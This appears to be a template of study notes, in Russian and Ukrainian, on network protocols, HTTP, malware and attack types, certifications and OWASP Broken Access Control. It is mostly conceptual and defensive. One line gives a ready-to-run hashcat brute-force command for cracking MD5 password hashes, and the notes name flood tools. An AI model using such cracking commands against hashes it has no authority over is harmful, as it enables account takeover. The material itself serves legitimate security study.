            1. Клиент, который намеревается установить соединение, посылает серверу сегмент с номером последовательности и флагом SYN.<br>
            - Сервер получает сегмент, запоминает номер последовательности и пытается создать сокет (буфера и управляющие структуры памяти) для обслуживания нового клиента.<br>
            - В случае успеха сервер посылает клиенту сегмент с номером последовательности и флагами SYN и ACK, и переходит в состояние SYN-RECEIVED.<br>
            - В случае неудачи сервер посылает клиенту сегмент с флагом RST.<br>
            2. Если клиент получает сегмент с флагом SYN, то он запоминает номер последовательности и посылает сегмент с флагом ACK.<br>
            - Если клиент одновременно получает и флаг ACK (что обычно и происходит), то он переходит в состояние ESTABLISHED.<br>
            - Если клиент получает сегмент с флагом RST, то он прекращает попытки соединиться.<br>
            - Если клиент не получает ответа в течение 10 секунд, то он повторяет процесс соединения заново.<br>
            3. Если сервер в состоянии SYN-RECEIVED получает сегмент с флагом ACK, то он переходит в состояние ESTABLISHED.<br>
            - В противном случае после тайм-аута он закрывает сокет и переходит в состояние CLOSED.<br>
                                
        //- UDP
        details
          summary UDP
          p.
            <dfn>UDP</dfn> - User Datagram Protocol <br>
            В отличии от TCP, UDP - очень быстрый протокол поскольку в нём определён самый минимальный механизм необходимый для передачи данных. <br>
            Сообщения поступают в любом порядке и то, которое отправлено первым, может быть получено последним. <br>
            Доставка сообщений UDP вовсе не гарантируется, сообщение может потеряться и могут быть получены две копии одного и того же сообщения. <br>
            Такой случай возникает если для отправки сообщений в один адрес использовать два разных маршрута. <br>
            UDP не требует открывать соединение и данные могут быть отправлены сразу же как только они подготовлены. <br>
            UDP не отправляет подтверждающие сообщения, поэтому данные могут быть потеряны.
          img(src="./img/web/TCP__UDP.png" alt="")
          img(src="./img/web/TCP_UDP.png" alt="")
                                
        //- SOAP
        details
          summary SOAP
          p.
            <dfn>SOAP</dfn> — протокол обмена структурированными сообщениями в распределённой вычислительной среде. <br>
            Первоначально SOAP предназначался, в основном, для реализации удалённого вызова процедур (RPC). <br>
            Сейчас протокол используется для обмена произвольными сообщениями в формате XML, а не только для вызова процедур.<br>        
          img(src="./img/web/soap.png" alt="")
          br
          p.
            <dfn>SOAP-сообщение</dfn> представляет собой XML-документ; <br>
            сообщение состоит из трех основных элементов: <br>
            <br>
            <dfn>SOAP Envelope</dfn> - конверт. <br>
            Является самым «верхним» элементом SOAP сообщения. <br>
            Содержит корневой элемент XML-документа. <br>
            Описывается с помощью элемента Envelope с обязательным пространством имен: <br>
            http://www.w3.org/2003/05/soap-envelope для версии 1.2 <br>
            и http://schemas.xmlsoap.org/soap/ для версии 1.1. <br>
            <br>
            <dfn>SOAP Header</dfn> - заголовок. <br>
            Первый прямой дочерний элемент конверта. Необязательный. <br>
            Заголовок кроме атрибутов xmlns может содержать 0 или более стандартных атрибутов: <br>
            - encodingStyle <br>
            - actor (или role для версии 1.2) <br>
            - mustUnderstand <br>
            - relay <br>
            <br>
            <dfn>SOAP Body</dfn> - тело. <br>
            Элемент Body обязательно записывается сразу за элементом Header, если он есть в сообщении, или первым в SOAP-сообщении, если заголовок отсутствует. <br>
            В элемент Body можно вложить произвольные элементы, спецификация никак не определяет их структуру. <br>
            Определен только один стандартный элемент, который может быть в теле сообщения - Fault, содержащий сообщение об ошибке. <br>
            Если SOAP-сервер, обрабатывая поступившее SOAP-сообщение, обнаружит ошибку, то он прекратит обработку и отправит клиенту SOAP-сообщение, содержащее один элемент Fault с сообщением об ошибке.<br>
            <br>
            REST vs SOAP - Простота VS Стандарты<br>
          img(src="./img/web/rs1.png" alt="")
          img(src="./img/web/rs2.png" alt="")
          img(src="./img/web/rs3.png" alt="")
          img(src="./img/web/rs4.png" alt="")
          img(src="./img/web/rs5.png" alt="")
          img(src="./img/web/rs6.png" alt="")
          br
          p.
            <dfn>WSDL</dfn> - Web Services Definition Language <br>
            Язык описания веб-сервисов WSDL (Web Services Description Language) основан на языке XML<br>
            Каждый документ WSDL можно разбить на следующие логические части:<br>
            - <dfn>определение типов данных</dfn> (types) — определение вида отправляемых и получаемых сервисом XML сообщений<br>
            - <dfn>элементы данных</dfn> (message) — сообщения, используемые web-сервисом<br>
            - <dfn>абстрактные операции</dfn> (portType) — список операций, которые могут быть выполнены с сообщениями<br>
            - <dfn>связывание сервисов</dfn> (binding) — способ, которым сообщение будет доставлено<br>
          img(src="./img/web/WSDL.png" alt="")

        //- HTTP
        details
          summary HTTP
          p.
            <dfn>HyperText Transfer Protocol</dfn> — «протокол передачи гипертекста» — протокол прикладного уровня передачи данных. <br>
            Изначально — в виде гипертекстовых документов в формате HTML (документов, которые содержат ссылки, позволяющие переходить к другим документам). <br>
            В настоящий момент используется для передачи произвольных данных).<br>
          img(src="./img/web/request.png" alt="")
          p Основой HTTP является технология «клиент-сервер», то есть предполагается существование потребителей (клиентов), которые инициируют соединение и посылают запрос, и поставщиков (серверов), которые ожидают соединения для получения запроса, производят необходимые действия и возвращают обратно сообщение с результатом.<br>
          img( src="./img/web/ClientServer.png" alt="")
          p.
            Обычно с помощью протокола HTTP осуществляется обмен данными между вэб-браузером и вэб-сервером.<br>
            Благодаря протоколу HTTP обеспечивается работа всемирной паутины.<br>
            Также HTTP часто используется как протокол передачи информации для других протоколов прикладного уровня, таких как: SOAP, XML-RPC, WebDAV.<br>
            В таком случае говорят, что протокол HTTP используется как транспорт.<br>
            API многих программных продуктовиспользую HTTP для передачи данных - сами данные при этом могут иметь любой формат: XML или JSON.<br>
            Как правило передача данных по протоколу HTTP осуществляется через TCP/IP-соединения.<br>
            Серверное ПО при этом обычно использует TCP-порт 80, хотя может использовать и любой другой.<br>

          //- HTTP-structure
          details
            summary HTTP-structure
            p Каждое HTTP-сообщение состоит из трёх частей:

            //- Starting line
            details
              summary Starting line
              p.
                <dfn>Стартовая строка</dfn> (англ. Starting line) — определяет тип сообщения. <br>
                Method - URI - Version <br>
                - <dfn>Method</dfn> - метод запроса. <br>
                - <dfn>URI</dfn> - путь к запрашиваемому документу. <br>
                - <dfn>Version</dfn> - версия протокола, пара разделенных точкой цифр. Например: 1.0
              img(src="./img/web/req.png" alt="")
              p.
                <dfn>Стартовая строка ответа</dfn> <br>
                Version - Status Code - Reason Phrase <br>
                <dfn>Version</dfn> - версия протокола, пара разделенных точкой цифр. Например: 1.0<br>
                <dfn>Код состояния</dfn> (англ. Status Code) — три цифры. <br>
                Відповіді HTTP: <br>
                - Informational responses (100 – 199) <br>
                - Successful responses (200 – 299) <br>
                - Redirection messages (300 – 399) <br>
                - Client error responses (400 – 499) <br>
                - Server error responses (500 – 599) <br>
                По коду состояния определяется дальнейшее содержимое сообщения и поведение клиента. <br>
                <dfn>Пояснение</dfn> (англ. Reason Phrase) — текстовое короткое пояснение к коду ответа для пользователя. <br>
                Никак не влияет на сообщение и является необязательным. <br>
              img(src="./img/web/res.png" alt="")
              
            //- HTTP-mathods
            details
              summary HTTP-mathods
              p.
                <dfn>Тип HTTP-запроса</dfn> (также называемый HTTP-метод) указывает серверу на то, какое действие мы хотим произвести с ресурсом. <br>
                Изначально (в начале 90-х) предполагалось, что клиент может хотеть от ресурса только одно — получить его, однако сейчас по протоколу HTTP можно создавать посты, редактировать профиль, удалять сообщения и многое другое. <br>
                И эти действия сложно объединить термином «получение».<br>
                <br>
                <dfn>OPTIONS</dfn> - Используется для определения возможностей веб-сервера или параметров соединения для конкретного ресурса.<br>
                <br>
                <dfn>GET</dfn> - Используется для запроса содержимого указанного ресурса. <br>
                С помощью метода GET можно также начать какой-либо процесс.<br>
                <br>
                <dfn>HEAD</dfn> - Аналогичен методу GET, за исключением того, что в ответе сервера отсутствует тело. <br>
                Запрос HEAD обычно применяется для извлечения метаданных, проверки наличия ресурса (валидация URL) и чтобы узнать, не изменился ли он с момента последнего обращения.<br>
                <br>
                <dfn>POST</dfn> - Применяется для передачи пользовательских данных заданному ресурсу. <br>
                Например, в блогах посетители обычно могут вводить свои комментарии к записям в HTML-форму, после чего они передаются серверу методом POST и он помещает их на страницу. <br>
                При этом передаваемые данные (в примере с блогами — текст комментария) включаются в тело запроса.<br>
                <br>
                <dfn>PUT</dfn> - Применяется для загрузки содержимого запроса на указанный в запросе URI. <br>
                Если по заданному URI не существует ресурс, то сервер создаёт его и возвращает статус 201 (Created). <br>
                Если же был изменён ресурс, то сервер возвращает 200 (Ok) или 204 (No Content).<br>
                <br>
                <dfn>PATCH</dfn> - Аналогично PUT, но применяется только к фрагменту ресурса.<br>
                <br>
                <dfn>DELETE</dfn> - Удаляет указанный ресурс.<br>
                <br>
                <dfn>TRACE</dfn>  - Возвращает полученный запрос так, что клиент может увидеть, какую информацию промежуточные серверы добавляют или изменяют в запросе.<br>
                <br>
                <br><dfn>CONNECT</dfn> - Преобразует соединение запроса в прозрачный TCP/IP-туннель, обычно чтобы содействовать установлению защищённого SSL-соединения через нешифрованный прокси.<br>
                <br>
              img(src="./img/web/get.png" alt="")
              img(src="./img/web/post.png" alt="")
              
            //- HTTP-status
            details
              summary HTTP-status
              p.
                Код состояния является частью первой строки ответа сервера. <br>
                Он представляет собой целое число из трёх цифр. <br>
                Первая цифра указывает на класс состояния. <br>
                За кодом ответа обычно следует отделённая пробелом поясняющая фраза на английском языке, которая разъясняет человеку причину именно такого ответа<br>
                <br>
                1xx - <dfn>Информационный</dfn> (англ. informational) - Информирование о процессе передачи. <br>
                В HTTP/1.0 — сообщения с такими кодами должны игнорироваться. <br>
                В HTTP/1.1 — клиент должен быть готов принять этот класс сообщений как обычный ответ, но ничего отправлять серверу не нужно. <br>
                Сами сообщения от сервера содержат только стартовую строку ответа и, если требуется, несколько специфичных для ответа полей заголовка. <br>
                Прокси-серверы подобные сообщения должны отправлять дальше от сервера к клиенту<br>
                <br>
                2xx - <dfn>Успех</dfn> (англ. Success) - Информирование о случаях успешного принятия и обработки запроса клиента. <br>
                В зависимости от статуса, сервер может ещё передать заголовки и тело сообщения.<br>
                <br>
                3xx - <dfn>Перенаправление</dfn> (англ. Redirection) - Сообщает клиенту, что для успешного выполнения операции необходимо сделать другой запрос (как правило по другому URI). <br>
                Из данного класса пять кодов <b>301, 302, 303, 305 и 307</b> относятся непосредственно к перенаправлениям (редирект). <br>
                Адрес, по которому клиенту следует произвести запрос, сервер указывает в заголовке Location. <br>
                При этом допускается использование фрагментов в целевом URI.<br>
                <br>
                4xx - <dfn>Ошибка клиента</dfn> (англ. Client Error) - Указание ошибок со стороны клиента. <br>
                При использовании всех методов, кроме HEAD, сервер должен вернуть в теле сообщения гипертекстовое пояснение для пользователя.<br>
                <br>
                5xx - <dfn>Ошибка сервера</dfn> (англ. Server Error) - Информирование о случаях неудачного выполнения операции по вине сервера. <br>
                Для всех ситуаций, кроме использования метода HEAD, сервер должен включать в тело сообщения объяснение, которое клиент отобразит пользователю.<br>
            
            //- HTTP Headers
            details
              summary HTTP Headers
              p.
                <dfn>Заголовки HTTP</dfn> (англ. HTTP Headers) — это строки в HTTP-сообщении, содержащие разделённую двоеточием пару параметр-значение. <br>
                Формат заголовков соответствует общему формату заголовков текстовых сетевых сообщений ARPA (см. RFC 822). <br>
                Заголовки должны отделяться от тела сообщения хотя бы одной пустой строкой<br>
              img(src="./img/web/Header.png" alt="")
              img(src="./img/web/Headers.png" alt="")
                
            //- Message body
            details
              summary Message body
              p <dfn>Тело HTTP-сообщения</dfn> (message-body), если оно присутствует, используется для передачи тела объекта, связанного с запросом или ответом.<br>
              img(src="./img/web/Cookie.png" alt="")
          
        //- HTTPS
        details
          summary HTTPS
          p.
            <dfn>HTTPS</dfn> (Hypertext Transfer Protocol Secure) — защищённая версия HTTP. <br>
            Использует SSL-протокол, который активируется после установки SSL-сертификата и зашифровывает личную информацию, перед тем как передать её владельцу сайта<br>
          img(src="./img/web/connect.png" alt="")
          p.
            Ключи шифрования HTTPS. <br>
            В основе любого метода шифрования лежит ключ. <br>
            <dfn>Ключ</dfn> — это способ зашифровать или расшифровать сообщение. <br>
            В работе SSL-сертификата участвуют три ключа: публичный, приватный и сеансовый<br>
          img(src="./img/web/key.png" alt="")

    //- Certifications
    details
      summary Certifications
      p.
        CCST - Это сертификация начального уровня для новичков, 
        готовящихся начать свою карьеру в сфере кибербезопасности. 
        Она ориентирована на учащихся старших классов и студентов, 
        а также тех, кто заинтересован в смене профессии. 
        Этот сертификат не имеет срока действия и не требует периодической переаттестации.

        CompTiA Security+ - Это сертификат безопасности начального уровня,
        отвечающий требованиям Директивы Министерства обороны США 8570.01-M,
        являющийся важным пунктом для тех, кто хочет работать
        в области ИТ-безопасности для федерального правительства.

        EC Council Certified Ethical Hacker (CEH) - Эта сертификация проверяет 
        ваше понимание и знание того, как искать слабые места и уязвимости 
        в целевых системах, используя те же знания и инструменты, 
        что и злонамеренный хакер, но законным и легитимным способом.

        CISSP ISC2 - Это наиболее узнаваемый и популярный сертификат безопасности. 
        Чтобы сдать экзамен, необходимо иметь по крайней мере пять лет опыта 
        работы в соответствующей отрасли.

        Cisco CyberOps - Эта сертификация подтверждает навыки, 
        необходимые для аналитиков по кибербезопасности в операционных центрах безопасности.

        <em>Активності:</em><br>
        - Тестування на проникнення/Аудит/Консультація<br>
        - Полювання на вразливості (Bug Bounty)<br>
        - Capture the flag<br>
        - Аудит на дотримання вимог<br>
        - Розробка та впровадження політик безпеки<br>
        - Керування ризиками<br>
        - Оперативний центр безпеки (SOC)<br>
        - DevSecOps<br>
      a(href="https://campaigns.eccouncil.org/become-a-certified-ethical-hacker-intl") Сертифікація CEH<br>
      a(href="https://elearnsecurity.com/") Сертифікація INE Security<br>
      a(href="https://www.offsec.com/") Сертифікація Offensive security<br>
      a(href="https://www.sans.org/") SANS, Cyber Security Training, Certifications, Degrees and Resources<br>
      a(href="https://www.amazon.jobs/de/teams/aws-security-engineer") AWS Security Engineer<br>
      a(href="https://www.isc2.org/") Сертифікації (ISC)2<br>
      img(src="./img/web/Cert.png" alt="")

    //- Вредоносное ПО
    details
      summary Вредоносное ПО
      p.
        Вредоносное программное обеспечение – это любой код, который может использоваться для похищения данных, обхода системы управления доступом, повреждения или компрометации системы.
        
        Вирус – это тип компьютерной программы, которая при выполнении реплицируется и присоединяется к другим файлам, например легитимной программе, вставляя в нее собственный код. Одни вирусы не наносят вреда, другие могут быть разрушителями, например, изменяющими или удаляющими данные. Большинство вирусов для активации нуждаются в взаимодействии с конечным пользователем, также они могут быть написаны для срабатывания в определенную дату или время.
        Вирусы могут распространяться либо через съемные носители, такие как USB-накопители, либо через загрузку в Интернете, либо через вложения электронной почты. Открытие файла или выполнение программы может активировать работу вируса. После активации вирус обычно инфицирует другие программы на компьютере или других компьютерах сети. Для предупреждения обнаружения вирусы довольно часто мутируют.
        Например, созданный в 1999 году вирус Melissa распространялся по электронной почте, инфицировав десятки тысяч пользователей и нанеся ущерб примерно на 1,2 миллиарда долларов.
        
        Червь – это злонамеренная программа, которая самостоятельно себя клонирует и распространяет, используя уязвимости в сетях. В отличие от вирусов, нуждающихся в запуске программ на узлах, черви могут запускаться самостоятельно. Помимо начального инфицирования узла они не требуют участия пользователя и могут очень быстро распространяться по сети, обычно замедляя ее работу.
        Черви построены по схожим шаблонам: они используют уязвимости систем, имеют способ самораспространения и содержат вредоносный код, так называемую полезную нагрузку (Payload) для повреждения компьютерных систем или сетей.
        Черви вызвали некоторые из самых разрушительных атак в Интернете. В 2001 году червь Code Red лишь за 19 часов инфицировал более 300 тысяч серверов.
        
        Троянский конь (Trojan Horse) – это вредоносное программное обеспечение, выполняющее вредоносные операции, маскируя свое настоящее намерение. Оно может показаться легальным, но на самом деле чрезвычайно опасно. Программы-трояне эксплуатируют привилегии тех пользователей, которые их запускают во исполнение.
        В отличие от вирусов, троянские лошади не саморазмножаются, а привязываются к неисполняемым файлам, в частности, файлам изображений, аудио или видео, действуя как приманка, с целью нанесения ущерба системам пользователей, не имеющим никаких подозрений по этому поводу.
        
        Логическая бомба (Logic Bomb) – это вредоносная программа, ожидающая активации (например, наступление определенной даты или появления определенной записи в базе данных) для запуска вредоносного кода. Логическая бомба остается неактивной до срабатывания события-триггера.
        
        Программа-вымогатель (Ransomware) – это программа, предназначенная для блокировки компьютерной системы или размещенных в ней данных до момента совершения выкупа.
        
        Серое или условно вредоносное программное обеспечение (Grayware) – это любая программа или приложение, поведение которого является раздражительным или нежелательным.

    //- Aтаки
    details
      summary Aтаки
      p.
        <dfn>Атаки отказа в обслуживании</dfn> (DoS) – это тип сетевой атаки, которую относительно легко может совершить даже неквалифицированный злоумышленник.<br>
        <br>
        <dfn>Распределенная атака DoS</dfn> (DDoS) подобна атаке DoS, но она происходит от нескольких скоординированных источников.<br>
        <dfn>Бот</dfn>-компьютер обычно заражается в результате посещения веб-сайта, открывания вложения электронной почты или через зараженный медиа-файл.<br>
        <br>
        <dfn>Ботнет</dfn> – это группа ботов, соединенных через Интернет, которые могут контролироваться одним злоумышленником или группой.<br>
        <br>
        Например:<br>
        - Злоумышленник строит сеть (ботнет) из зараженных узлов, которые называются зомби, контролируемыми системами управления.<br>
        - Компьютеры-зомби будут постоянно сканировать и заражать все больше узлов, создавая все больше и больше зомби.<br>
        - Когда ботнет будет готов, хакер даст инструкцию системам управления, чтобы заставить ботнет зомби осуществить DDoS-атаку.<br>
        <br>
        Распределенные атаки отказа в обслуживании (DDoS, Distributed Denial of Service) подобны атакам отказа в обслуживании, но происходят из нескольких скоординированных источников.
        Злоумышленник строит сеть (Botnet) из инфицированных узлов, так называемых «зомби» (Zombies), контролируемых системами управления.
        Компьютеры-зомби постоянно сканируют сети и инфицируют все больше узлов, создавая все больше и больше зомби.
        Когда ботнет будет готов к использованию, хакер посылает команду системам управления ботнета осуществить DDoS-атаку.

        Атаки истощения ресурсов (Resource Exhaustion Attacks) – это атаки, которые вызывают аварийное завершение работы, зависание или иначе мешают функционировать программе-жертве или системе-жертве. В отличие от перегрузки пропускной способности сети, вызывающей DoS-атака, атаки истощения ресурсов вызывают перегрузку имеющихся аппаратных ресурсов сервера-жертвы.

        <em>Атаки на пароли</em>:<br>
        - <dfn>Распыление пароля</dfn><br>
        Эта техника пытается получить доступ к системе путем «распыления» нескольких часто используемых паролей на множество учетных записей.<br>
        К примеру, киберпреступник использует "Password123" со многими именами пользователей, прежде чем попробовать еще раз со вторым часто используемым паролем, таким как "qwerty".<br>
        Эта техника позволяет злоумышленнику оставаться незамеченным, поскольку он избегает частой блокировки аккаунта.<br>
        <br>
        - <dfn>Атака по словарю</dfn><br>
        Хакер систематически пробует каждое слово в словаре или списке часто употребляемых слов как пароль, пытаясь взломать защищенную паролем учетную запись.<br>
        <br>
        - <dfn>Атака грубой силы</dfn><br>
        Самый простой и часто используемый способ получения доступа к защищенному паролем сайту — атаки грубой силы,<br>
        заключающиеся в том, что злоумышленник использует все возможные комбинации букв, цифр и символов в пространстве для паролей, пока он не справится.<br>
        <br>
        - <dfn>Атака радугой</dfn><br>
        Пароли в компьютерной системе хранятся не как обычный текст, а как хешированные значения (числовые значения, однозначно идентифицирующие данные).<br>
        <dfn>Радужная таблица</dfn> – это большой словарь предварительно вычисленных хешей и паролей, из которых они были вычислены.<br>
        В отличие от атаки грубой силы, которая должна вычислять каждый хэш, радужная атака сравнивает хэш пароля с хранящимся в таблице радуги.<br>
        Когда злоумышленник находит соответствие, он идентифицирует пароль, используемый для создания хеша.<br>
        <br>
        - <dfn>Перехват трафика</dfn><br>
        Простой текст или незашифрованные пароли могут быть легко прочитаны другими людьми и машинами, перехватывая соединение.<br>
        Если вы сохраняете пароль в виде четкого, читабельного текста, любой, кто имеет доступ к вашему аккаунту или устройству, будь то авторизованный или неавторизованный, сможет прочитать его.<br>
        <br>
        Атака на API
        Атака, при которой передача корректных данных злонамеренно или мошеннически повторяется или задерживается злоумышленником, который перехватывает, изменяет и повторно посылает данные, чтобы заставить получателя выполнить действия, необходимые злоумышленнику.

        Упрощенный протокол доступа к каталогам (LDAP, Lightweight Directory Access Protocol) – это открытый протокол, на основе которого осуществляется аутентификация пользователей при доступе к службам каталогов.
        Атака LDAP-инъекция использует уязвимости проверки ввода данных, за счет внедрения и выполнения запросов к LDAP-серверам, предоставляя киберпреступникам возможность получать конфиденциальную информацию из LDAP-каталога организации.
        Для получения определенной информации (названий внутренних систем, названий имеющихся на веб-сервере каталогов или файлов, названий баз данных, таблиц и полей, которые можно использовать для реализации SQL-атак и т.п.), злоумышленники могут использовать сообщения об ошибках.
        Обход каталога происходит в случае, если злоумышленник может прочитать файлы веб-сервера, размещенные вне каталога веб-сайта. Затем злоумышленник может использовать эту информацию для загрузки файлов конфиденциальных настроек сервера, потенциально обнаружить больше уязвимостей сервера или даже получить контроль над ним!

        <dfn>Усовершенствованные устойчивые угрозы</dfn> (advanced persistent threats, АРТ) – многофазные, долговременные, незаметные и сложные действия, направленные на конкретную жертву.<br>
        По этой причине отдельному злоумышленнику часто не хватает навыков, ресурсов или настойчивости для выполнения APT.<br>
        <br>
        Исследователи безопасности Google обнаружили <b>Meltdown</b> и <b>Spectre</b>, две аппаратные уязвимости, влияющие на многие центральные процессоры (ЦП), выпущенные с 1995 года в настольных компьютерах, ноутбуках, серверах, смартфонах, умных устройствах и облачных сервисах.<br>
        Злоумышленники, эксплуатирующие эти уязвимости, могут прочитать всю память из данной системы (Meltdown), а также данные, обрабатываемые другими программами (Spectre).<br>
        <br>
        - <dfn>Переполнение буфера</dfn>
        <em>Буферы</em> – это области памяти, выделенные приложению.<br>
        Эта уязвимость возникает, когда данные записываются вне буфера.<br>
        Изменяя данные за пределами буфера, приложение получает доступ к памяти, выделенной для других процессов. Это может повлечь за собой крах системы, компрометацию данных или получение полномочий более высокого уровня.<br>
        <br>
        Буферы – области оперативной памяти, которые выделяются для работы каждому приложению. Переполнение буфера (Buffer Overflow) возникает, если объем данных превышает размер выделенного буфера. Изменяя данные за пределами буфера, приложение получает доступ к оперативной памяти, выделенной для других процессов. Такая ситуация может повлечь за собой выход системы из строя, компрометацию данных или получение полномочий более высокого уровня.
        
        - <dfn>Непроверенные входящие данные</dfn>
        Входящие данные могут содержать вредоносное содержимое, предназначенное для того, чтобы заставить программу вести себя непредсказуемо.<br>
        <br>
        - <dfn>Гонка</dfn>
        Эта уязвимость описывает ситуацию, когда результат события зависит от того, в какой последовательности или с какой продолжительностью выполняются инструкции.<br>
        Состояние гонки становится источником уязвимости, когда события, требующие упорядочения или временной синхронизации, не происходят в правильном порядке или не укладываются в положенные временные рамки.<br>
        <br>
        Атака гонки (Race Сondition Attack), также известная как атака на время проверки (TOC, Time Of Check ) или атака по времени использования (TOU, Time Of Use) - это атака, которая заставляет компьютерную систему, предназначенную для выполнения задач в определенной последовательности одновременно выполнять две или более операции.
        Например, работа операционной системы – это работа совокупности потоков — наименьших последовательностей программных инструкций, необходимых для выполнения процесса. Случай, когда два или более потока получают доступ к общим данным и пытаются изменить их одновременно, это случай реализации атаки гонки.

        - <dfn>Недостатки системы безопасности</dfn>
        Системы и конфиденциальные данные можно защитить с помощью таких методов, как аутентификация, авторизация и шифрование.<br>
        Разработчики должны использовать методы безопасности и библиотеки, уже созданные, протестированные и проверенные, и не должны пытаться создавать собственные алгоритмы безопасности. Вероятно, это может внести новые уязвимости.<br>
        <br>
        - <dfn>Контроль доступа</dfn>
        Процесс контроля того, кто что делает, и варьируется от управления физическим доступом к оборудованию до определения того, кто имеет доступ к ресурсу, например файлу, и что они могут с ним делать, например, читать или изменять файл.<br>
        Многие уязвимости безопасности появляются из-за неправильного использования средств контроля доступа.<br>
        Почти все средства контроля доступа и меры предосторожности можно обойти, если злоумышленник имеет физический доступ к целевому оборудованию.<br>
        К примеру, независимо от настроек разрешения на файл, хакер может обойти операционную систему и прочитать данные непосредственно с диска.<br>
        Для защиты устройств и размещенных на них данных необходимо использовать ограничения физического доступа.<br>
        Для защиты данных от кражи или повреждения следует использовать методы шифрования.<br>
        <br>

        TCP SYN Flood - отсыл большого количества запросов на соединение
        TCP reset - отправка пакета с сегиентом TCP RST вызовет прерывание соединения
        TCP session hijacking - подделывает IP-адрес одного из узлов,
        предусматривает следующий порядковый номер IP-адреса и отправляет ACK на другой узел

        UDP flood - UDP Unicorn или Low Orbit Ion Cannon - проверят все порты
        и от каждого закрытого порта сервер отправит ICMP про недестопность
        получается лавина ICMP от всех серверов сети.

      //- Broken Access Control
      details
        summary Broken Access Control
        p.
          <dfn>Broken Access Control</dfn> (Нарушение контроля доступа). <br>
          Контроль доступа обеспечивает соблюдение политики, согласно которой пользователи не могут действовать за пределами своих разрешений. 
          Сбои обычно приводят к несанкционированному раскрытию информации, изменению или уничтожению всех данных или выполнению бизнес-функции 
          за пределами возможностей пользователя.
          <ul>К распространенным уязвимостям контроля доступа относятся:
            <li>Нарушение принципа минимальных привилегий или запрета по умолчанию, 
                согласно которому доступ должен предоставляться только для определенных возможностей, 
                ролей или пользователей, но доступен всем.</li>
            <li>Обход проверок контроля доступа путем изменения URL-адреса (подделка параметров или принудительный просмотр), 
                внутреннего состояния приложения или страницы HTML либо с помощью инструмента атаки, изменяющего запросы API.</li>
            <li>Разрешение просмотра или редактирования чужой учетной записи путем предоставления ее уникального идентификатора 
                (небезопасные прямые ссылки на объекты)</li>
            <li>Доступ к API с отсутствующими элементами управления доступом для POST, PUT и DELETE.</li>
            <li>Повышение привилегий. Действовать как пользователь без входа в систему или действовать как администратор при входе в систему как пользователь.</li>
            <li>Манипулирование метаданными, например воспроизведение или подделка токена управления доступом JSON Web Token (JWT), 
                файлов cookie или скрытых полей, манипулируемых для повышения привилегий или злоупотребления аннулированием JWT.</li>
            <li>Неправильная конфигурация CORS обеспечивает доступ к API из неавторизованных/ненадежных источников.</li>
            <li>Принудительно просматривать аутентифицированные страницы в качестве неаутентифицированного пользователя 
                или привилегированные страницы в качестве обычного пользователя.</li>
          </ul>
          Контроль доступа эффективен только в доверенном серверном коде или бессерверном API, где злоумышленник не может изменить проверку контроля доступа или метаданные.
          <ul>
            <li>За исключением общедоступных ресурсов, по умолчанию запрещено.</li>
            <li>Реализуйте механизмы контроля доступа один раз и повторно используйте их во всем приложении, 
                включая минимизацию использования совместного использования ресурсов между источниками (CORS).</li>
            <li>Средства управления доступом к модели должны обеспечивать право собственности на записи, а не признавать, 
                что пользователь может создавать, читать, обновлять или удалять любую запись.</li>
            <li>Требования к бизнес-лимитам уникальных приложений должны обеспечиваться моделями предметной области.</li>
            <li>Отключите список каталогов веб-сервера и убедитесь, что метаданные файлов (например, .git) 
                и файлы резервных копий не присутствуют в корнях веб-сайта.</li>
            <li>Регистрируйте сбои контроля доступа и при необходимости предупреждайте администраторов (например, о повторяющихся сбоях).</li>
            <li>Ограничьте скорость доступа к API и контроллеру, чтобы минимизировать ущерб от инструментов автоматизированных атак.</li>
            <li>Идентификаторы сеансов с отслеживанием состояния должны быть признаны недействительными на сервере после выхода из системы. 
                Токены JWT без сохранения состояния должны быть недолговечными, чтобы окно возможностей для злоумышленника было сведено к минимуму. 
                Для долгоживущих JWT настоятельно рекомендуется следовать стандартам OAuth для отзыва доступа.</li>
          </ul>
          Разработчики и сотрудники отдела контроля качества должны включить функциональный модуль контроля доступа и интеграционные тесты. <br>
          a(href="https://cwe.mitre.org/data/index.html">CWE: 22, 23, 35, 59, 200, 201, 219, 264, 275, 276, 284, 285, 352, 359, 377, 402, 425. 441, 497, 538, 540, 548,
          552, 566, 601, 639, 651, 668, 706, 862, 863, 913, 922, 1275.              
        img(src="./img/web/Access.png" alt="")
        img(src="./img/web/Access_.png" alt="")
        img(src="./img/web/Access__.png" alt="")
        img(src="./img/web/Session.png" alt="")
        img(src="./img/web/Session_.png" alt="")
        br
        p.
          Burp Suite — це інтегрована платформа та графічний інструмент для тестування безпеки веб-додатків, 
          він підтримує весь процес тестування, від початкового відображення та аналізу поверхні атаки програми до пошуку 
          та використання вразливостей безпеки.
        
          Туторіали по користуванню інструментом
          https://www.youtube.com/watch?v=nECt-0zW0O4
          https://www.youtube.com/watch?v=G3hpAeoZ4ek
        
          Cookie — це невеликий фрагмент даних, який сервер надсилає веб-браузеру користувача. Браузер може зберігати файли cookie 
          та надсилати їх назад на той самий сервер із наступними запитами. Як правило, файли cookie HTTP використовуються, щоб визначити, 
          чи надходять два запити з одного браузера, наприклад, щоб користувач залишався в системі. 
          Він запам’ятовує інформацію про стан для HTTP-протоколу без збереження стану.
        
          Детальніше про cookie
          https://www.cloudflare.com/learning/privacy/what-are-cookies/
          https://en.wikipedia.org/wiki/HTTP_cookie

          Методи автентифікації
          * HTML forms
          * Multi-factor Authentication
          * Client SSL certificates
          * HTTP Basic and Digest Authentication
          * NTLM or Kerberous
          * Login Services (Oauth)
        
          Рекомендації по встановленню пароля
          * Default credentials
          * Blank password
          * Predictable username/password
          * Password rules
          * The same as username
          * Default values
        
          hashcat -m 0 hash1.txt -O -a 3 -1 \?d\?l\?u \?1\?1\?1\?1\?1\?1\?1\?1
        
          Захист від брутфорсу
          * Lockout
          * Lockout with valid password
          * Cookie
          * Captcha
          * Username bruteforce
          * LockOut attack
        
          Функціонал зміни/відновлення паролю
          * Ask current password
          * Bruteforce
          * Easy question
          * Password hints
          * Third party applications:
          * Password in clear text
          * Directly session access
          * Do not check an email
          * Guessable ID
          * User notifications
        
          Вразливості
          * Remember me functionality
          * Same usernames
          * Activation Link
          * Generated password
          * Password distribution
          * Multistage Login
          * Deleted/locked account
          * Insecure credential storage
        
          Захист
          * Use strong credentials
          * Correct credential validation
          * Prevent credential disclosure
          * Prevent bruteforce attack
          * Change password and account recovery functionality is secure
          * Log monitor notify
        
          Broken access control 
          Це тип вразливості, який дозволяє неавторизованому користувачу доступ до обмежених ресурсів. 
          Використовуючи цю вразливість, зловмисники можуть обійти стандартні функції захисту та отримати несанкціонований доступ до конфіденційної інформації або систем. 
        
          Детальніше про broken access
          https://medium.com/purplebox/broken-access-control-f82235ddf888
        
